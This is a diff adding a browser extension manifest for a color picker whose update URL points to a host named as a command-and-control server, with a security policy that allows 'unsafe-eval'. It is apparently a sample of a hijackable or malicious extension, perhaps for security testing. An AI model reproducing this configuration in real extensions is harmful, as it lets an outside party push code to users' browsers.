@@ -1,0 +1,13 @@
+{
+  "manifest_version": 3,
+  "name": "Pro Color Picker & Palette EyeDropper",
+  "version": "3.8.0",
+  "description": "Popular color picker utility used by web designers.",
+  "update_url": "https://unverified-third-party-c2.com/updates.xml",
+  "content_security_policy": {
+    "extension_pages": "script-src 'self' 'unsafe-eval'; object-src 'self';"
+  },
+  "background": {
+    "service_worker": "background.js"
+  }
+}
